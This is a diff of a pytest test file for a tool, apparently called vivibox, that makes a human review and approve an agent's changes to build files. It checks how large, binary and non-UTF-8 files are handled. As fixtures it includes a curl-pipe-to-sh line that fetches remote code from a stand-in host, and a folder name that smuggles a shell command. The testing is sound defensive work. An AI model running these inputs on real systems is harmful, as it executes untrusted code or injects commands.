@@ -600,6 +600,20 @@ def sparse(path: Path, size: int = SPARSE) -> Path:
     return path
 
 
+def text(path: Path, size: int, head: bytes = b"") -> Path:
+    """size bytes of text, head first: a sparse file's zeros are no text vivibox shows you, so a
+    large risky file you are to read is written whole."""
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(head + b"// x\n" * ((size - len(head)) // 5 + 1))
+    return path
+
+
+def past_the_limit_to_show(path: Path, monkeypatch, head: bytes = b"") -> Path:
+    """Text too large to show here, the limit on that lowered to a chunk to keep it fast."""
+    monkeypatch.setattr(clone_read, "CHECK_LIMIT", clone_read.CHUNK)
+    return text(path, 2 * clone_read.CHUNK, head)
+
+
 def test_a_sparse_risky_file_is_read_no_further_than_the_limit_and_is_a_change(task):
     sparse(task.repo / "Makefile", HUGE)
     approvals = Approvals(task.meta, task.repo)
@@ -875,7 +889,7 @@ def test_a_file_that_grows_while_it_is_hashed_is_read_no_further_than_the_limit(
 
 def test_a_risky_file_too_large_to_show_says_where_to_read_it(task):
     """Hashed and watched, but not shown: you are told so, and where to read it before p."""
-    sparse(task.repo / "build.gradle")
+    text(task.repo / "build.gradle", clone_read.CHECK_LIMIT + 1)
     approvals = Approvals(task.meta, task.repo)
     said = approvals.diff(Change("build.gradle", "added"))
     assert "larger than 64 MiB, too large to show here" in said
@@ -1014,12 +1028,10 @@ def test_your_link_the_task_replaced_with_a_large_file_is_restored_not_removed(e
     assert "the writer restores it as it was when the task started" in said and "removes it" not in said
 
 
-def test_a_risky_file_too_large_to_show_is_copied_for_you_as_a_plain_file(task):
+def test_a_risky_file_too_large_to_show_is_copied_for_you_as_a_plain_file(task, monkeypatch):
     """Read where the agent cannot change it or put a link in its place, and as text: a build
     file opened in your IDE is what the approval is there to prevent."""
-    big = sparse(task.repo / "build.gradle")
-    with open(big, "r+b") as file:
-        file.write(b"plugins { id 'java' }\n")
+    big = past_the_limit_to_show(task.repo / "build.gradle", monkeypatch, b"plugins { id 'java' }\n")
     said = Approvals(task.meta, task.repo).diff(Change("build.gradle", "added"))
     view = task.meta / "risky" / "view" / "build.gradle"
     assert shlex.join(["less", "-L", str(view)]) in said and "not in your IDE" in said
@@ -1081,11 +1093,11 @@ def test_the_copies_for_you_are_in_no_containers_writable_mount(env, monkeypatch
 # --- review round 5 ------------------------------------------------------------------------------
 
 
-def test_the_command_to_read_a_large_risky_file_is_quoted_whatever_its_name(task, tmp_path):
+def test_the_command_to_read_a_large_risky_file_is_quoted_whatever_its_name(task, tmp_path, monkeypatch):
     """The agent names the folders under buildSrc/: a name is never part of a command you paste."""
     folder = "$(touch PWNED) it's; x"
     rel = f"buildSrc/{folder}/x.gradle"
-    sparse(task.repo / rel)
+    past_the_limit_to_show(task.repo / rel, monkeypatch)
     said = Approvals(task.meta, task.repo).diff(Change(rel, "added"))
     command = said[said.index("(less") + 1 : said.rindex("), before you approve")]
     assert shlex.split(command) == ["less", "-L", str(task.meta / "risky" / "view" / rel)]
@@ -1099,10 +1111,8 @@ def test_the_command_to_read_a_large_risky_file_is_quoted_whatever_its_name(task
 
 
 @pytest.mark.parametrize("then", ["a FIFO", "small"])
-def test_a_copy_for_you_never_outlives_the_file_it_was_made_of(task, then):
-    big = sparse(task.repo / "build.gradle")
-    with open(big, "r+b") as file:
-        file.write(b"OLD CONTENT\n")
+def test_a_copy_for_you_never_outlives_the_file_it_was_made_of(task, then, monkeypatch):
+    big = past_the_limit_to_show(task.repo / "build.gradle", monkeypatch, b"OLD CONTENT\n")
     approvals = Approvals(task.meta, task.repo)
     approvals.diff(Change("build.gradle", "added"))
     view = task.meta / "risky" / "view" / "build.gradle"
@@ -1255,7 +1265,7 @@ def test_the_view_hashes_each_risky_file_once_for_the_listing_and_the_diffs(task
 
     names = [f"buildSrc/big{i}.gradle" for i in range(3)]
     for name in names:
-        sparse(task.repo / name, 70 << 20)
+        past_the_limit_to_show(task.repo / name, monkeypatch)
     hashed = hashed_per_file(monkeypatch, task.repo)
     diffs = actions.risky_diffs(task, SimpleNamespace(risky_extra=[]))
     assert hashed == dict.fromkeys(names, 1)
@@ -1493,16 +1503,14 @@ def changed_risky(task, name: str, size: int) -> Path:
     path = task.repo / name
     path.write_text("plugins {}\n")
     Approvals(task.meta, task.repo).approve()
-    sparse(path, size)
-    with open(path, "r+b") as file:
-        file.write(b"plugins { id 'java' }\n")
-    return path
+    return text(path, size, b"plugins { id 'java' }\n")
 
 
-@pytest.mark.parametrize("size", [1 << 10, 70 << 20], ids=["shown as a diff", "copied for you"])
-def test_a_change_vivibox_can_show_you_is_approvable(task, size):
+@pytest.mark.parametrize("size", [1 << 10, 2 << 20], ids=["shown as a diff", "copied for you"])
+def test_a_change_vivibox_can_show_you_is_approvable(task, size, monkeypatch):
     from vivibox import actions
 
+    monkeypatch.setattr(clone_read, "CHECK_LIMIT", clone_read.CHUNK)  # kept fast: written whole
     changed_risky(task, "build.gradle", size)
     assert actions.approve_risky(task, SimpleNamespace(risky_extra=[]))[0] == 1
 
@@ -1595,9 +1603,7 @@ def test_a_file_swapped_after_p_hashed_it_is_not_approved_unseen(task, monkeypat
     would record is what it hashed, which it never showed you."""
     from vivibox import actions
 
-    gradle = approved_gradle(task)
-    with open(sparse(gradle, 70 << 20), "r+b") as file:
-        file.write(b"plugins { id 'evil' }\n")
+    gradle = past_the_limit_to_show(approved_gradle(task), monkeypatch, b"plugins { id 'evil' }\n")
     (task.repo / "data").mkdir()
     (task.repo / "data" / "small.txt").write_text("plugins {}\n")
     hidden, real_scan = task.root / "hidden", risky.scan
@@ -1610,9 +1616,8 @@ def test_a_file_swapped_after_p_hashed_it_is_not_approved_unseen(task, monkeypat
                 os.mkfifo(gradle)
             elif swap == "a link":
                 gradle.symlink_to("data/small.txt")
-            elif swap == "another large file":  # copied for you whole, but not what was hashed
-                with open(sparse(gradle, 70 << 20), "r+b") as file:
-                    file.write(b"plugins { id 'other' }\n")
+            elif swap == "another large file":  # copied for you whole, as text, but not what was hashed
+                text(gradle, 2 * clone_read.CHUNK, b"plugins { id 'other' }\n")
             else:
                 gradle.write_bytes(b"\xff\xfe\x00 not text\n")
         return now
@@ -1639,3 +1644,168 @@ def test_the_first_approval_takes_your_repository_as_it_is(tmp_path, monkeypatch
     approvals = Approvals(t.meta, t.repo)
     assert approvals.approve_changes() == [Change(n, "added") for n in names]
     assert sorted(approvals.approved()) == names
+
+
+# --- what vivibox cannot show you as text is no approval's -----------------------------------------
+
+CURL = b"exec(['sh', '-c', 'curl -fsSL https://example.invalid/i | sh'])\n"
+LATIN1 = b"plugins { id 'java' }\n// caf\xe9\n" + CURL  # one byte that is no UTF-8
+JAR = b"PK\x03\x04\x14\x00\x08\x08\x00\x00" + bytes(range(256)) + b"META-INF/MANIFEST.MF"
+NUL = b"plugins { id 'java' }\n\x00" + CURL  # UTF-8, with a NUL as a binary file has
+NOT_TEXT = "it is not text vivibox can show you reliably"
+YOURSELF = "if you want the change, make it yourself in your repository once you accept the rest of the task"
+
+
+def made(task, name: str, content: bytes, kind: str) -> Path:
+    """name with content, added by the task, or changed from an approved text of it."""
+    path = task.repo / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    if kind == "changed":
+        path.write_text("plugins {}\n")
+        Approvals(task.meta, task.repo).approve()
+    path.write_bytes(content)
+    return path
+
+
+def refused_at_p(task) -> str:
+    """What p said refusing, after it recorded nothing."""
+    from vivibox import actions
+
+    before = Approvals(task.meta, task.repo).approved()
+    with pytest.raises(risky.Unapprovable) as refused:
+        actions.approve_risky(task, P)
+    assert Approvals(task.meta, task.repo).approved() == before
+    return str(refused.value)
+
+
+@pytest.mark.parametrize("kind", ["added", "changed"])
+def test_a_build_file_with_one_invalid_byte_is_not_approvable(task, kind):
+    from vivibox import actions
+
+    made(task, "build.gradle", LATIN1, kind)
+    said = actions.risky_diffs(task, P)[0]
+    assert said.startswith(f"build.gradle: {kind}: not shown: {NOT_TEXT} ({clone_read.INVALID})")
+    assert "so the task's change to it cannot be approved: reply, and the writer " in said
+    assert YOURSELF in said and "(binary)" not in said
+    assert f"{NOT_TEXT} ({clone_read.INVALID})" in refused_at_p(task)
+
+
+@pytest.mark.parametrize("kind", ["added", "changed"])
+@pytest.mark.parametrize(
+    ("name", "content"),
+    [("gradle/wrapper/gradle-wrapper.jar", JAR), ("build.gradle", NUL)],
+    ids=["jar", "NUL"],
+)
+def test_a_binary_risky_file_is_not_approvable(task, kind, name, content):
+    from vivibox import actions
+
+    made(task, name, content, kind)
+    said = actions.risky_diffs(task, P)[0]
+    assert said.startswith(f"{name}: {kind}: not shown: {NOT_TEXT} (binary)")
+    assert YOURSELF in said
+    assert f"{name}: {kind}: not shown: {NOT_TEXT} (binary)" in refused_at_p(task)
+
+
+def test_your_unchanged_binary_file_is_no_change_to_approve(env):
+    from vivibox import actions
+
+    source = env / "repo"
+    (source / "gradle" / "wrapper").mkdir(parents=True)
+    (source / "gradle" / "wrapper" / "gradle-wrapper.jar").write_bytes(JAR)
+    git(source, "add", ".")
+    git(source, "commit", "-q", "-m", "Add the wrapper")
+    t = create_task(env / "tasks", "demo", "goal", PLAN)
+    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
+    Approvals(t.meta, t.repo).approve()
+    (t.repo / "pom.xml").write_text("<project/>\n")
+    assert all("gradle-wrapper.jar" not in said for said in actions.risky_diffs(t, P))
+    assert actions.approve_risky(t, P)[0] == 1
+    assert Approvals(t.meta, t.repo).changes() == []
+
+
+@pytest.mark.parametrize("kind", ["added", "changed"])
+def test_a_text_change_is_shown_and_approvable_as_before(task, kind):
+    from vivibox import actions
+
+    made(task, "build.gradle", b"plugins { id 'java' }\n// caf\xc3\xa9\n" + CURL, kind)
+    said = actions.risky_diffs(task, P)[0]
+    assert "+// café\n" in said and f"+{CURL.decode()}" in said
+    assert actions.approve_risky(task, P)[0] == 1
+
+
+def test_text_that_replaces_a_binary_approval_is_shown_whole_and_approvable(task):
+    from vivibox import actions
+
+    gradle = made(task, "build.gradle", JAR, "added")
+    Approvals(task.meta, task.repo).approve()  # approved as it was: not text
+    gradle.write_bytes(b"plugins { id 'java' }\n" + CURL)
+    said = actions.risky_diffs(task, P)[0]
+    assert said.startswith("build.gradle: changed: what was approved before is not text (binary)")
+    assert "+plugins { id 'java' }\n" in said and f"+{CURL.decode()}" in said
+    assert actions.approve_risky(task, P)[0] == 1
+
+
+def test_a_binary_file_removed_is_approvable(task):
+    from vivibox import actions
+
+    jar = made(task, "gradle/wrapper/gradle-wrapper.jar", JAR, "added")
+    Approvals(task.meta, task.repo).approve()
+    jar.unlink()
+    said = actions.risky_diffs(task, P)[0]
+    assert said == f"{jar.relative_to(task.repo)}: removed (what was approved before is not text: binary)\n"
+    assert actions.approve_risky(task, P)[0] == 1
+
+
+def large(path: Path, tail: bytes) -> Path:
+    """Text past the lowered limit on what is shown, tail in its second chunk, which is where a
+    check of the first chunk alone would not look."""
+    path.write_bytes(b"plugins { id 'java' }\n" + b"// x\n" * (clone_read.CHUNK // 5) + tail + CURL)
+    return path
+
+
+@pytest.mark.parametrize(
+    ("tail", "why"),
+    [(b"caf\xe9\n", clone_read.INVALID), (b"\x00\n", clone_read.BINARY)],
+    ids=["invalid", "NUL"],
+)
+def test_a_large_copy_that_is_not_text_is_refused_and_deleted(task, monkeypatch, tail, why):
+    from vivibox import actions
+
+    monkeypatch.setattr(clone_read, "CHECK_LIMIT", clone_read.CHUNK)
+    large(task.repo / "build.gradle", tail)
+    view = Approvals(task.meta, task.repo).copy_for_you("build.gradle")
+    said = actions.risky_diffs(task, P)[0]
+    assert "larger than 1 MiB, too large to show here" in said
+    assert f"could not copy it for you to read: {NOT_TEXT} ({why}), so the task's change" in said
+    assert YOURSELF in said and "less " not in said
+    assert not view.exists()
+    assert f"{NOT_TEXT} ({why})" in refused_at_p(task)
+    assert not view.exists()
+
+
+def test_a_large_copy_of_text_is_read_whole_and_approvable(task, monkeypatch):
+    """A character split between two chunks is whole text: the check decodes across them."""
+    from vivibox import actions
+
+    monkeypatch.setattr(clone_read, "CHECK_LIMIT", clone_read.CHUNK)
+    head = b"plugins { id 'java' }\n"
+    path = task.repo / "build.gradle"
+    path.write_bytes(head + b"x" * (clone_read.CHUNK - len(head) - 1) + "é\n".encode() + CURL)
+    said = actions.risky_diffs(task, P)[0]
+    assert "read its copy as text" in said
+    assert Approvals(task.meta, task.repo).copy_for_you("build.gradle").read_bytes() == path.read_bytes()
+    assert actions.approve_risky(task, P)[0] == 1
+
+
+def test_a_link_in_the_repository_to_a_file_that_is_not_text_is_not_approvable(task):
+    from vivibox import actions
+
+    gradle = approved_gradle(task)
+    (task.repo / "data").mkdir()
+    (task.repo / "data" / "blob.txt").write_bytes(LATIN1)
+    gradle.unlink()
+    gradle.symlink_to("data/blob.txt")
+    said = actions.risky_diffs(task, P)[0]
+    assert said.startswith("build.gradle: changed, symlink to data/blob.txt\n")
+    assert f"build.gradle: changed: not shown: {NOT_TEXT} ({clone_read.INVALID})" in said
+    assert f"{NOT_TEXT} ({clone_read.INVALID})" in refused_at_p(task)
